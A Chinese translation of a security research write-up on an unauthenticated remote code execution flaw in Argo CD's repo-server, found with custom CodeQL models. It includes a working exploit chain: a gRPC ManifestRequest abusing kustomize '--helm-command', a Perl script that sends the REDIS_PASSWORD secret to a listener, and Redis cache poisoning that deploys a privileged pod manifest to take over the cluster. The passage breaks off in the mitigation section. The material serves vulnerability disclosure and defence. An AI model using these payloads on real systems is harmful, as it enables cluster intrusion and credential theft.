#  ArgoCD未认证RCE漏洞剖析  
Dubito
                    Dubito  云原生安全指北   2026-07-03 00:35  
  
   
  
> 注：本文翻译自 Synacktiv 的文章  
《Caught in the Octopus Trap: Unauthenticated RCE in Argo CD with CodeQL》[1]  
，可点击文末“阅读原文”按钮查看英文原文。  
  
## 摘要  
  
Synacktiv 发现了 ArgoCD 的 repo-server 组件中存在未认证的任意代码执行漏洞，可能导致整个集群被攻陷。本文将解释如何利用 CodeQL 发现该漏洞，详细描述利用过程以获取对底层 Kubernetes 集群的控制，并介绍一个自动化攻击的工具。  
## 一、引言  
  
过去一年，Synacktiv 发布了多篇关于 CI/CD 漏洞和错误配置的文章 [  
1[2]  
] [  
2[3]  
] [  
3[4]  
] [  
4[5]  
] [  
5[6]  
]。其中大多数集中在软件配置管理 (SCM，Software Configuration Management) 系统，如 GitHub、GitLab 和 Azure DevOps。这些系统实现了自己的 CI/CD 系统，通过在构建、测试和部署应用时自动化执行来帮助团队和开发者。  
  
在 Kubernetes 集群中部署应用和服务最流行的工具之一是 Argo CD。2023 年，Argo CD 进行了一项   
调查[7]  
，93% 的受访者表示他们在生产环境中使用了 Argo CD。Argo CD 提供了一种简化的应用部署解决方案，基于 GitOps 范式。GitOps 是一种现代的基础设施和应用部署方法，它将 Git 仓库作为唯一真实源。通过使用基础设施即代码 (IaC)，它确保基础设施配置被自动应用，提供了一种声明式且高效的方式来管理 Kubernetes 集群。  
  
为了有效运行并在 Kubernetes 集群中部署资源，Argo CD 需要在集群中拥有较高权限。此外，它还可以访问私有 Git 仓库，这使其成为攻击者极具吸引力的目标。  
## 二、Argo CD 的架构  
  
Argo CD 的架构相当简单：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5D3ojpumLiau2yvHmwEfT6seYrG0u4mpqFmHaU7exhnEorjl8iaQckWceXaLibQBoVCbdjyVxUsyic0I2cgLr5YItFlhHIcdF5Tz7M/640?from=appmsg "null")  
  
API 服务器 暴露了 Web UI 和 CLI 使用的 gRPC/REST API。它处理与应用管理相关的请求，例如创建、更新和删除应用，并将它们与存储在 Git 仓库中的期望状态同步。这由 Git webhook 事件触发。它还负责通过 RBAC 策略管理身份验证和授权。此组件需要管理一些 secrets，例如集群和仓库凭据，这些通过 Kubernetes secrets 进行管理。  
  
应用控制器会持续监控部署在 Kubernetes 集群中的应用的实际状态。它将应用的实际状态与 Git 仓库中定义的期望状态进行比较，并确保两者同步。如果检测到差异，控制器可以触发必要的操作来协调状态，例如部署新资源或回滚更改。  
  
作为易受攻击的组件，仓库服务器负责与 Git 仓库交互，以获取应用manifest、Helm Charts 和其他 Kubernetes 资源配置。它充当 Argo CD 与源代码控制系统之间的桥梁，确保检测到仓库的更改并将其应用到 Kubernetes 集群。一旦从 Git 仓库获取数据，就会生成 Kubernetes manifest并返回以部署资源。  
  
图中虽然没有显示，但实际上还存在着一个 Redis 数据库。该数据库负责存储缓存信息，例如manifest（manifests）。此外，文档提到，插件生成的一些 secrets 可以缓存在此数据库中：  
> Argo CD 将插件生成的manifest以及注入的 secrets 缓存到其 Redis 实例中。这些manifest也可以通过 repo-server API 获取。这意味着，任何有权访问 Redis 实例或 repo-server 的人都可以获取这些 secrets。  
  
## 三、添加 CodeQL RemoteFlowSources  
  
Argo CD 是一个庞大的 Golang 项目，代码超过 238,000 行。手动审计如此规模的代码库以寻找漏洞不仅极其耗时，而且非常容易出错。为了解决这个问题，我们转向使用 CodeQL 来全面了解该代码库的结构，并开始分析应用的各个组件。  
  
CodeQL 是一个功能强大的静态代码分析器，它提供了一种通过编写查询来分析代码的方法，这使得它在白盒环境下寻找漏洞时非常有用。它允许你通过创建新查询或利用现有查询来搜索易受攻击的模式。此外，CodeQL 的数据流分析可以跨函数调用跟踪数据，这一特性对于检测注入漏洞（例如我们将要分析的漏洞）尤为有用。  
  
如果你不熟悉这个工具，或者只想快速复习一下，我强烈建议你看看我们  
之前的一些工作[8]  
。在我们开始介绍为此项目编写的自定义查询之前，它是一个很好的基础知识回顾。  
  
CodeQL 有一些默认的安全查询，运行它们可能不会产生任何结果，因为 Argo CD 的安全团队已经实现了一个 GitHub Actions 工作流，在他们的代码库上运行 CodeQL：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5CIN07NaeqxVj2mmkcSlF2uZSibHz8TN9MG8ibQP6mr07K4vfLAlajticcTW1kZVicERH3a8a1DMBzxwkM4TEQtzOUThjyDgBs6yoQ/640?from=appmsg "null")  
  
为了增强默认功能，可以从以下 GitHub 仓库添加新的查询和模型包：  
- •   
GitHubSecurityLab/CodeQL-Community-Packs[9]  
  
- •   
trailofbits/codeql-queries[10]  
  
来自 GitHubSecurityLab 的   
githubsecuritylab/audit/attack-surface[11]  
 查询可在运行任何安全查询之前，用于初步分析代码库：  
```
import semmle.go.security.FlowSources

from RemoteFlowSource::Range source
where not source.getFile().getRelativePath().matches("%/test/%")
select source, "remote", source.getFile().getRelativePath(), source.getStartLine(),
  source.getEndLine(), source.getStartColumn(), source.getEndColumn()
```  
  
其目标是映射项目中的所有 RemoteFlowSource  
。RemoteFlowSource  
 指的是任何可以被外部用户操纵的数据，例如 GET 参数、请求头或文件内容（在分析 CLI 工具时）。  
  
以下是一些结果：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5AA2HAJ9NHECUxMVHYWaUNibJGDZ51aUDfLwjLBH5ZHsOBs8aRK9N28UEdcXsLxEsBwIr1rSOicmZHdAHuLfZQfwl7sH8kpGzsk4/640?from=appmsg "null")  
  
CodeQL 识别出了一些 RemoteFlowSource  
，例如 HTTP 请求的 body。然而，为了获得更有意义的结果，我们希望定位用户向 API 发出请求时创建的 Go 对象。通过这样，我们可以避免处理将 body 解析为 JSON 对象，然后再解析为 Go 对象的复杂性。这种方法通过更接近 sink 开始分析，提高了 CodeQL 的污点跟踪能力。  
  
例如，对于 GetGitFiles  
 函数，我们希望告诉 CodeQL request  
 参数是我们可以控制的：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5AcVzTCTEfDD0a9YibGSq6S7icEskTNLPibD0WesOJcbet6FrrvNAicOyicCBuAibsF4Mg4CBvFndJ7pSJByXW3aH0eGxKNuamAu6yks/640?from=appmsg "null")  
  
GitFilesRequest  
对象是从 JSON 格式中解析而来的：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5B3KBf0bNWnicJ19rlbjkq8cUCL3fSRUbejRFfJibicaz9oFSDbAItGvP2XBEOh2yLiaTqyIJSQXfpDcksxCsRVXmmahGph6CVOrww/640?from=appmsg "null")  
  
仔细观察所有这些功能后，可以很快发现其中的规律：  
```
$ rg -i 'func .*Context'
server/repository/repository.go
73:func (s *Server) getRepo(ctx context.Context, url, project string) (*appsv1.Repository, error) {
91:func (s *Server) getConnectionState(ctx context.Context, url string, project string, forceRefresh bool) appsv1.ConnectionState {
125:func (s *Server) List(ctx context.Context, q *repositorypkg.RepoQuery) (*appsv1.RepositoryList, error) {
130:func (s *Server) Get(ctx context.Context, q *repositorypkg.RepoQuery) (*appsv1.Repository, error) {

server/applicationset/applicationset.go
118:func (s *Server) Get(ctx context.Context, q *applicationset.ApplicationSetGetQuery) (*v1alpha1.ApplicationSet, error) {
137:func (s *Server) List(ctx context.Context, q *applicationset.ApplicationSetListQuery) (*v1alpha1.ApplicationSetList, error) {
183:func (s *Server) Create(ctx context.Context, q *applicationset.ApplicationSetCreateRequest) (*v1alpha1.ApplicationSet, error) {

reposerver/repository/repository.go
183:func (s *Service) ListRefs(ctx context.Context, q *apiclient.ListRefsRequest) (*apiclient.Refs, error) {
206:func (s *Service) ListApps(ctx context.Context, q *apiclient.ListAppsRequest) (*apiclient.AppList, error) {
240:func (s *Service) ListPlugins(ctx context.Context, _ *empty.Empty) (*apiclient.PluginList, error) {
515:func (s *Service) GenerateManifest(ctx context.Context, q *apiclient.ManifestRequest) (*apiclient.ManifestResponse, error) {
```  
  
对于每个接收者类型为 Server  
 或 Service**[1]**  
 且第一个参数类型为 context.Context**[2]**  
 的 Go 函数，我们可以合理假设第二个参数 **[3]**  
 是用户可以控制的。因此，我们可以指示 CodeQL 将其视为 RemoteFlowSource  
。注意，这种启发式方法并不完美，可能会产生假阳性。  
  
这可以在 CodeQL 中使用以下类进行建模：  
```
import goclass TargetReceiver extends Type {
    TargetReceiver(){        this.getName() = ["Server", "Service"] /* [1] */
    }
}class ApiMethods extends Method {
    ApiMethods(){        this.getReceiverBaseType() instanceof TargetReceiver and        /* The first parameter of the target method has type context.Context */        this.getParameter(0).getType().hasQualifiedName("context", "Context") /* [2] */
    }
}class UntrustedParameter extends Parameter {
    UntrustedParameter(){        /* We tag the 2nd parameter of such method as untrusted */
        exists(Method m | m instanceof ApiMethods and m.getParameter(1) = this) /* [3] */
    }
}
```  
  
为了确保所有 CodeQL 查询都包含我们新的 RemoteFlowSource  
，我们可以利用   
CodeQL 强大的模型包功能[12]  
。该功能允许我们通过建模特定库或框架元素（如函数、字段和参数）的行为来自定义分析。这样一来，我们扩展了数据流分析中潜在的source 和 sink，最终提高了结果的准确性。  
  
在我们的案例中，我们希望添加额外的源，这是通过 YAML 文件完成的，以下是文档中的示例：  
```
extensions:  - addsTo:      pack: codeql/go-all      extensible: sourceModel    data:      - [          "net/http",          "Request",          True,          "FormValue",          "",          "",          "ReturnValue",          "remote",          "manual",
        ]
```  
  
该模型引入了一个 RemoteFlowSource  
（sourceModel  
），允许 CodeQL 跟踪 net/http  
 包中 FormValue  
 函数的返回值。  
  
将其应用于我们之前的示例，对于 GetGitFiles  
 函数将产生以下结果：  
```
- [    "github.com/argoproj/argo-cd/v2/reposerver/repository",    "Service",    True,    "GetGitFiles",    "",    "",    "Parameter[1]",    "remote",    "manual",
  ]
```  
  
我们希望将 GetGitFiles  
 函数的第二个参数（接收者为 Service  
）作为一个新的源来跟踪。此操作需要对之前识别的所有函数进行。  
  
使用之前的 UntrustedParameter  
 CodeQL 类，我们可以通过以下查询自动生成所有内容：  
```
from Parameter p, Method m
where p instanceof UntrustedParameter and
m.getParameter(1) = p
select "\"" + m.getReceiverBaseType().getPackage().toString().suffix(8) + "\", \""+ m.getReceiverBaseType() +"\", True, \"" + m.getName() + "\", \"\", \"\", \"Parameter[1]\", \"remote\", \"manual\""
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5CMlSickbGcaeYeVZCAWfYKhkUqvDODGd0lp2mMibCvynjLF8FDicBmV3icGRqKS7X7uaozTicH41hRacOPskaLjz2K7m91pVgvTdSI/640?from=appmsg "null")  
  
对于某些语言来说，可以使用 VSCode 的模型编辑器功能来执行此操作。  
  
拥有这个新的模型包后，我们可以重新运行 GitHubSecurityLab 的查询，以验证新 RemoteFlowSource  
 的检测：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5A86vwbzZT3UV56EXyX7ZtfusSF25aPLL6zRR4g1R3r7Uib2rspoiaYF47egw4R9TyL7t1233KWV690Gwh6qdpy9sy0BqCN6MzOQ/640?from=appmsg "null")  
  
现在，我们可以正确且高效地解析各种源，从而能够识别漏洞。例如，命令注入漏洞。  
## 四、使用 CodeQL 寻找 RCE  
  
首先，由于在早期研究中已经遇到过 Golang 的污点问题，我们能够利用该工作，并添加以下模型以确保 os/exec  
 的污点跟踪：  
```
- addsTo:      pack: codeql/go-all      extensible: sinkModel    data:      - ["os/exec", "", False, "Command", "", "", "Argument[0]", "command-injection", "manual"]      - ["os/exec", "", False, "Command", "", "", "Argument[1]", "command-injection", "manual"]      - ["os/exec", "", False, "CommandContext", "", "", "Argument[1]", "command-injection", "manual"]
```  
  
如果被污染的数据进入了 Command  
 函数的第一个或第二个参数中，该机制将能够检测出其中的命令注入漏洞。  
  
使用我们的模型包来执行所有的安全检测后，发现了多个命令注入漏洞：  
```
$ codeql database analyze /.../argo-cd-v2.13.3 --additional-packs /.../argocd-cd-ext/ --model-packs="synacktiv/argocd-cd-ext@latest" --format=sarif-latest --output=/.../argo-cd-ext.sarif --rerun go-sec.qls
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5BI4GO3EibBxEm6C3TPqBrGlGd00eGFYfTGoXdrRPJibuqSiaXCZsiawiaY1g4hCP8gw42NbBpbaB52weEficb9S7a9ckibp88GfLeEHo/640?from=appmsg "null")  
  
其中大部分会到达 kustomize.go  
 文件：  
```
File: kustomize.go244:         if opts.Namespace != "" {245:             cmd := exec.Command(k.getBinaryPath(), "edit", "set", "namespace", "--", opts.Namespace)
[...]311:             args := []string{"edit", "add", "component"}312:             args = append(args, opts.Components...)313:             cmd := exec.Command(k.getBinaryPath(), args...)
[...]325:     if kustomizeOptions != nil && kustomizeOptions.BuildOptions != "" {326:         params := parseKustomizeBuildOptions(k.path, kustomizeOptions.BuildOptions, buildOpts)327:         cmd = exec.Command(k.getBinaryPath(), params...)
```  
  
Kustomize  
 是 Kubernetes 生态系统中用于管理和自定义 Kubernetes manifest的工具。它允许用户定义一组基础 Kubernetes 资源，然后通过 overlays 修改这些资源，而无需更改原始文件。  
  
经过进一步调查，我们无法通过不同的 sink 实现任意代码执行。许多 sink 受到限制，制约了利用某些参数的能力，只有少数参数可控。然而，CodeQL 有一个命中结果指出 kustomizeOptions  
 对象是可控的（第 325 行）。  
  
该结构体包含一些有趣的字段：  
```
type KustomizeOptions struct {    // BuildOptions is a string of build parameters to use when calling `kustomize build`    BuildOptions string `protobuf:"bytes,1,opt,name=buildOptions"`    // BinaryPath holds optional path to kustomize binary    BinaryPath string `protobuf:"bytes,2,opt,name=binaryPath"`
}
```  
  
BinaryPath  
 字段在初始化期间被使用：  
```
case v1alpha1.ApplicationSourceTypeKustomize:
    kustomizeBinary := ""    if q.KustomizeOptions != nil {
        kustomizeBinary = q.KustomizeOptions.BinaryPath
    }
    k := kustomize.NewKustomizeApp(repoRoot, appPath, q.Repo.GetGitCreds(gitCredsStore), repoURL, kustomizeBinary, q.Repo.Proxy, q.Repo.NoProxy)
```  
  
如果该值不为空，它将覆盖 getBinaryPath  
 函数中的默认 kustomize  
 二进制文件：  
```
func (k *kustomize) getBinaryPath() string {    if k.binaryPath != "" {        return k.binaryPath
    }    return "kustomize"
}
```  
  
然后进入 parseKustomizeBuildOption  
 函数：  
```
func parseKustomizeBuildOptions(path string, buildOptions string, buildOpts *BuildOpts) []string {
    buildOptsParams := append([]string{"build", path}, strings.Fields(buildOptions)...)
[...]
```  
  
这意味着如果我们控制 KustomizeOptions  
 结构体，就可能执行类似以下的命令：  
```
exec.Command("controlled", []string{"build", "path", "controlledArgument1", "controlledArgument2"...})
```  
  
尽管只有第一个和第二个参数不是通过被污染的 KustomizeOptions  
 控制的，但这听起来很有希望。  
  
然而，KustomizeOptions  
 结构体并未通过 API 定义暴露给最终用户。它是在 Argo CD 服务器初始化时设置的，无法通过 API 或 Web UI 修改。更改此设置需要修改 Argo CD 配置manifest，这需要集群权限。更多细节可以在  
文档[13]  
中找到。  
  
该路径的 source 来自以下方法，这与我们的模型包一致（我们应该控制第二个参数）：  
```
func (s *Service) GenerateManifest(ctx context.Context, q *apiclient.ManifestRequest) (*apiclient.ManifestResponse, error)
```  
  
存在漏洞的函数位于 repo-server  
 组件中。在此过程中，用户发起一个 API 调用到 API 服务器，请求生成manifest。然后 API 服务器将原始请求中的某些参数转发出去，如果管理员定义了 KustomizeOptions  
 结构体，它会被嵌入到发送给 repo-server  
 的 gRPC 请求中，目标端点是 /repository.RepoServerService/GenerateManifest  
。  
  
然而，我们发现 repo-server  
 暴露的 gRPC 服务器缺少认证：  
```
$ curl -kis -H 'Content-Type: application/grpc' https://argo-cd.local:8081/repository.RepoServerService/GenerateManifest
HTTP/2 405
content-type: application/grpc
grpc-status: 13
grpc-message: Received a HEADERS frame with :method "GET" which should be POST
```  
  
这意味着如果我们能够访问它（稍后详细说明），我们可以通过提供自己的 KustomizeOptions  
 实现未认证的远程代码执行。  
## 五、利用策略  
  
利用策略相当直接，我们只需使用所需参数进行 gRPC 调用。然而，通过调用一个任意二进制文件（其第二个参数硬编码为 "build" 字符串）来实现任意代码执行并非易事。选择通过 BuildOptions  
 字段进行利用，是因为 kustomize  
 二进制文件包含某些可以实现任意代码执行的参数：  
```
$ kustomize build --help
      --enable-helm                     Enable use of the Helm chart inflator generator.
      --helm-command string             helm command (path to executable) (default "helm")
[...]
```  
  
当用户创建 Argo CD 应用程序时，会使用指向 Git 仓库（包含集群部署信息）的 URL进行 API 调用。Argo CD 获取仓库内容并决定如何构建 Kubernetes manifest。如果它检测到仓库中使用了 kustomize  
，则会使用 kustomize  
 二进制文件来生成manifest。这使我们能够控制 kustomize  
 管理的所有文件，因为我们可以向 repo-server  
 指定任意的 Git URL。  
  
最终，这允许执行类似以下的操作：  
```
$ kustomize build pathWithControlledFiles --enable-helm --helm-command ./exfil.sh
```  
  
这是可行的，因为 Argo CD 从 Git 仓库中检索文件，并且执行发生在相对于下载的仓库的位置。  
  
在完成完整的利用之前，让我们暂停一下，快速回顾一下：  
1. 1. 我们可以对 GenerateManifest  
 发起未认证的 gRPC 调用，这将调用 kustomize  
  
1. 2. 一个任意的 Git 仓库会被下载到当前目录  
  
1. 3. 我们通过 KustomizeOptions  
 控制构建选项  
  
1. 4. 我们可以使用 --helm-command  
 执行任意命令  
  
在 Git 仓库中存储了一个 kustomization.yaml  
 文件：  
```
helmCharts:  - name: pwn    version: 0.0.1
```  
  
以及一个 bash 脚本：  
```
#!/bin/sh
perl exfil.pl
```  
  
虽然 repo-server  
 的环境仅限于少数二进制文件，但 Perl 是可用的。我们使用以下 Perl 脚本将 REDIS_PASSWORD  
 环境变量渗透到远程服务器：  
```
#!/usr/bin/perluse strict;use warnings;use IO::Socket::INET;my $remote_host = '127.0.0.1';my $remote_port = 4444;my $env_var = "REDIS_PASSWORD";my $data_to_send = $ENV{$env_var};my $socket = IO::Socket::INET->new(    PeerAddr => $remote_host,    PeerPort => $remote_port,    Proto    => 'tcp',
) or die "Failed to connect to $remote_host:$remote_port - $!";print $socket $data_to_send;$socket->close();
```  
  
最后，向 gRPC 服务器发送了以下 ManifestRequest  
 对象：  
```
manifestReq := &apiclient.ManifestRequest{    Repo: &v1alpha1.Repository{        Repo: "https://github.com/hugo-syn/pwn",
    },    Revision:  "HEAD",    AppName:   "pwn",    Namespace: "random",    ApplicationSource: &v1alpha1.ApplicationSource{        RepoURL:   "https://127.0.0.1",        Kustomize: &v1alpha1.ApplicationSourceKustomize{},
    },    ProjectName:        "ProjectName",    ProjectSourceRepos: []string{"*"},    KustomizeOptions: &v1alpha1.KustomizeOptions{        //BinaryPath: "/tmp/kustomize.sh",        BuildOptions: "--enable-helm --helm-command ./exfil.sh",
    },
}
```  
  
成功获得了反弹 shell：  
```
$ nc -lp 4444
NTvg13Rnb5VRK8ia
```  
## 六、更进一步：通过 Redis 服务器接管集群  
  
2024 年，Cycode 发布了一篇  
博客文章[14]  
，详细介绍了他们在 Argo CD 中发现的一个严重漏洞。他们发现 Redis 数据库无需认证即可访问。在他们的文章中，他们描述了仅通过与 Redis 交互就能入侵底层集群，但没有提供概念验证（Proof of Concept，PoC）。在本节中，我们将概述我们如何实现了类似的 Kubernetes 集群入侵。在他们的示例中，他们配置了一个 Argo CD 应用程序，启用了名为 selfHeal  
 的特定设置，但该选项默认并未启用。然而，我们找到了一种无需该特定选项即可利用此漏洞的方法，即通过操作数据库中的某些条目。  
  
根据 Argo CD 的   
文档[15]  
，Redis 数据库仅用于存储应用程序的缓存数据。数据库中的数据不是持久化的，会在 Pod 重启时重建：  
> Redis 仅用作一次性缓存，可以丢失。当丢失时，它将被重建，不会造成服务中断。  
  
  
我们最初尝试复现 Cycode 描述的利用场景。在他们的文章中，他们解释说存储在 Redis 数据库中的数据保存为 JSON 对象，然后进行 gzip 编码。我们创建了 argo-cdown  
 来与 ArgoCD 的各个组件交互。以下是可以在数据库中找到的内容示例：  
```
$ argo-cdown redis --server 127.0.0.1 --password NTvg13Rnb5VRK8ia --list-dataINFO[2025-02-24 16:54:57] Displaying all dataINFO[2025-02-24 16:54:57] Key: revisionmetadata|https://github.com/kubernetes-sigs/kustomize|447a60903cd142948443a6bd441b2749ad643815|1.8.3.gzINFO[2025-02-24 16:54:57] Key: app|resources-tree|legitapp|1.8.3.gzINFO[2025-02-24 16:54:57] Key: cluster|info|https://kubernetes.default.svc|1.8.3.gzINFO[2025-02-24 16:54:57] Key: revisionmetadata|https://github.com/kubernetes-sigs/kustomize|160de8ce76c69b646ee6fb96a88d94bba4e1964a|1.8.3.gzINFO[2025-02-24 16:54:57] Key: mfst|app.kubernetes.io/instance|legitapp|447a60903cd142948443a6bd441b2749ad643815|argocd|4090143128|1.8.3.gzINFO[2025-02-24 16:54:57] Key: git-refs|https://github.com/kubernetes-sigs/kustomize|1.8.3.gzINFO[2025-02-24 16:54:57] Key: app|managed-resources|legitapp|1.8.3.gzINFO[2025-02-24 16:54:57] Key: appdetails|447a60903cd142948443a6bd441b2749ad643815|2307065304|label|1.8.3.gz$ argo-cdown redis --server 127.0.0.1 --password NTvg13Rnb5VRK8ia --get-data 'cluster|info|https://kubernetes.default.svc|1.8.3.gz'INFO[2025-02-26 14:39:38] Key: cluster|info|https://kubernetes.default.svc|1.8.3.gzINFO[2025-02-26 14:39:38] Value: {  "connectionState": {    "status": "Successful",    "message": "",    "attemptedAt": "2025-02-26T13:39:29Z"
  },  "serverVersion": "1.32",  "cacheInfo": {    "resourcesCount": 387,    "apisCount": 50,    "lastCacheSyncTime": "2025-02-26T13:38:35Z"
  },  "applicationsCount": 1,
[...]
```  
  
他们发现应用程序会反复查询以 mfst  
 开头的特定键。该键包含与已部署应用程序相关的所有 manifests。如果启用了 selfHeal  
 选项并且添加了新的 manifest，Argo CD 将检测到更改并自动将其部署到集群中。  
  
以下是存储在 mfst  
 键中的内容示例：  
```
$ argo-cdown redis --server 127.0.0.1 --password NTvg13Rnb5VRK8ia --get-data 'mfst|app.kubernetes.io/instance|no-selfheal|25a0482ce72f083dcc0194a5c76867658a59271a|argocd|1663176825|1.8.3.gz'INFO[2025-02-25 16:48:24] Key: mfst|app.kubernetes.io/instance|no-selfheal|25a0482ce72f083dcc0194a5c76867658a59271a|argocd|1663176825|1.8.3.gzINFO[2025-02-25 16:48:24] Value: {  "cacheEntryHash": "9rlFbJFoK1I=",  "manifestResponse": {    "manifests": [      "{\"apiVersion\":\"v1\",\"kind\":\"Service\",\"metadata\":{\"labels\":{\"app\":\"helm-guestbook-edited-2\",\"app.kubernetes.io/instance\":\"no-selfheal\",\"chart\":\"helm-guestbook-edited-2-0.1.0\",\"heritage\":\"Helm\",\"release\":\"no-selfheal\"},\"name\":\"no-selfheal-helm-guestbook-edited-2\"},\"spec\":{\"ports\":[{\"name\":\"http\",\"port\":80,\"protocol\":\"TCP\",\"targetPort\":\"http\"}],\"selector\":{\"app\":\"helm-guestbook-edited-2\",\"release\":\"no-selfheal\"},\"type\":\"ClusterIP\"}}",      "{\"apiVersion\":\"apps/v1\",\"kind\":\"Deployment\",\"metadata\":{\"labels\":{\"app\":\"helm-guestbook-edited-2\",\"app.kubernetes.io/instance\":\"no-selfheal\",\"chart\":\"helm-guestbook-edited-2-0.1.0\",\"heritage\":\"Helm\",\"release\":\"no-selfheal\"},\"name\":\"no-selfheal-helm-guestbook-edited-2\"},\"spec\":{\"replicas\":1,\"revisionHistoryLimit\":3,\"selector\":{\"matchLabels\":{\"app\":\"helm-guestbook-edited-2\",\"release\":\"no-selfheal\"}},\"template\":{\"metadata\":{\"labels\":{\"app\":\"helm-guestbook-edited-2\",\"release\":\"no-selfheal\"}},\"spec\":{\"containers\":[{\"image\":\"gcr.io/heptio-images/ks-guestbook-demo:0.1\",\"imagePullPolicy\":\"IfNotPresent\",\"livenessProbe\":{\"httpGet\":{\"path\":\"/\",\"port\":\"http\"}},\"name\":\"helm-guestbook-edited-2\",\"ports\":[{\"containerPort\":80,\"name\":\"http\",\"protocol\":\"TCP\"}],\"readinessProbe\":{\"httpGet\":{\"path\":\"/\",\"port\":\"http\"}},\"resources\":{}}]}}}}"
    ],    "revision": "25a0482ce72f083dcc0194a5c76867658a59271a",    "sourceType": "Helm",    "commands": [      "helm template . --name-template no-selfheal [...] --include-crds"
    ]
  },  "mostRecentError": "",  "firstFailureTimestamp": 0,  "numberOfConsecutiveFailures": 0,  "numberOfCachedResponsesReturned": 0
}
```  
  
我们的应用程序基于这个   
仓库[16]  
 构建，它主要部署一个模拟应用程序到集群中。唯一启用的特定选项是 Auto Sync  
 功能，它会定期检查集群中已部署资源与 Git 仓库中最新版本之间的差异。然而，由于未启用 selfHeal  
 选项，Argo CD 只会在 Git 仓库发生更改时修改资源。在我们的利用场景中，我们假设我们对该仓库没有任何权限。请注意，如果未启用 Auto Sync  
 选项，则只有在用户手动对应用程序执行同步操作时，利用才能成功。  
  
在接下来的步骤中，目标将是向集群部署任意 manifest 以入侵它。为了说明这一点，我们将使用   
BadPods[17]  
 项目中的一个示例。manifest 使用以下命令转换为 JSON：  
```
$ kubectl convert -f everything-allowed-exec-deployment.yaml --output=json > manifest-evil.json
```  
  
如果我们尝试在没有 selfHeal  
 选项的情况下向 Redis 中的缓存条目添加一个 manifest，将导致以下状态：  
```
$ argo-cdown redis --server 127.0.0.1 --password NTvg13Rnb5VRK8ia --add-manifest 'mfst|app.kubernetes.io/instance|legitapp|447a60903cd142948443a6bd441b2749ad643815|argocd|4090143128|1.8.3.gz' --manifest manifest-evil.json
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5AgLibE5dOPKLKQ35SNpJvSmmSVlySU18hvEicInQibG3FcPSxZqHCJySNFmhNm3QRgGZgHWXndP831KKiaeFwO2OhZS4efTuv925o/640?from=appmsg "null")  
  
在这种情况下，由于 Git 仓库的 commit SHA1 与集群中部署的资源的 commit SHA1 匹配，应用程序不会自动同步。  
  
经过一番挖掘，我们在 Redis 数据库中发现了以下条目：  
```
$ argo-cdown redis --server 127.0.0.1 --password NTvg13Rnb5VRK8ia --get-data 'git-refs|https://github.com/hugo-syn/argocd-example-apps/|1.8.3.gz'
INFO[2025-02-25 16:47:18] Key: git-refs|https://github.com/hugo-syn/argocd-example-apps/|1.8.3.gz
INFO[2025-02-25 16:47:18] Value: [
  [    "refs/heads/master",    "25a0482ce72f083dcc0194a5c76867658a59271a"
  ],
  [    "HEAD",    "ref: refs/heads/master"
  ]
]
```  
  
它存储了项目的 commit SHA1，在我们的例子中，项目与 HEAD 修订版本同步。通过修改此值以引用之前的提交，下一次 Auto Sync 操作将导致 Argo CD 检测到更新的 HEAD 修订版本（原始值）。然后它将检查数据库中是否存在与该提交关联的缓存条目。如果找到条目（即我们添加了新 manifest 的那个条目），由于 commit SHA1 值不同，它将自动应用。以下是攻击的可视化表示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5Aje9AEjNDOtYksEQPGBzPGeC8CtiaRDhAPpflamiaBscfZCkuChtTl8s8OndFxzL5pOMq4VqfL9AwpsciaAOpWw3YRY3zBNDbbd8/640?from=appmsg "null")  
  
利用我们的工具，我们可以执行整个场景。第一步是将新的 manifest 添加到 mfst  
 条目中。  
```
$ argo-cdown redis --server 127.0.0.1 --password NTvg13Rnb5VRK8ia --add-manifest 'mfst|app.kubernetes.io/instance|no-selfheal|25a0482ce72f083dcc0194a5c76867658a59271a|argocd|1663176825|1.8.3.gz' --manifest manifest-evil.json
INFO[2025-02-25 16:48:16] Updating manifest
INFO[2025-02-25 16:48:16] Manifest updated
```  
  
然后修改或添加关联的 git-ref  
 条目：  
```
$ argo-cdown redis --server 127.0.0.1 --password NTvg13Rnb5VRK8ia --set-data 'git-refs|https://github.com/hugo-syn/argocd-example-apps/|1.8.3.gz' --data raw.json
INFO[2025-02-25 16:47:26] Modifying raw data of key :git-refs|https://github.com/hugo-syn/argocd-example-apps/|1.8.3.gz
INFO[2025-02-25 16:47:26] Done

$ cat raw.json
[
  [    "HEAD",    "ref: refs/heads/master"
  ],
  [    "refs/heads/master",    "ba44faf0a7ebe6b4716df30b17fba5b6d64f1106"
  ]
]
```  
  
短暂时间后，恶意 manifest 将被部署：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5C8LDmK7W7O22U7KQNALmiajZiaMsU2MvYia9ZaCTibAhebiaFPGnlGMm3WKjMic4y9BOicZEgz5QGXBZzZhLibrDSWghE7AcxIf67VWFw/640?from=appmsg "null")  
  
此时，攻击者将能够向集群部署任意 manifests，从而入侵它。  
## 七、缓解措施  
  
为了利用此漏洞，攻击者需要能够访问 repo-server 的 gRPC 端口和 Redis 数据库端口，这些端口不应暴露给用户。Argo CD 还提供了 Kubernetes 网络   
策略[18]  
，专门设计用于防止这种情况：  
```
spec:  podSelector:    matchLabels:      app.kubernetes.io/name: argocd-repo-server  policyTypes:    - Ingress  ingress:    - from:        - podSelector:            matchLabels:              app.kubernetes.io/name: argocd-server        - podSelector:            matchLabels:              app.kubernetes.io/name: argocd-application-controller        - podSelector:            matchLabels:              app.kubernetes.io/name: argocd-notifications-controller        - podSelector:            matchLabels:              app.kubernetes.io/name: argocd-applicationset-controller      ports:        - protocol: TCP          port: 8081
```  
  
然而，我们发现当通过 Helm 部署 Argo CD 时，这些策略   
并未应用[19]  
。在这种情况下，攻击者只需入侵集群中的一个 Pod 即可利用该漏洞：  
```
# Default network policy rules used by all componentsnetworkPolicy:  # -- Create NetworkPolicy objects for all components  create: false  # -- Default deny all ingress traffic  defaultDenyIngress: false
```  
  
Helm 是 Kubernetes 常用的包管理器，类似于 Python 的 pip。  
  
应用这些策略应该可以防止这种利用场景，可以使用以下命令检查：  
```
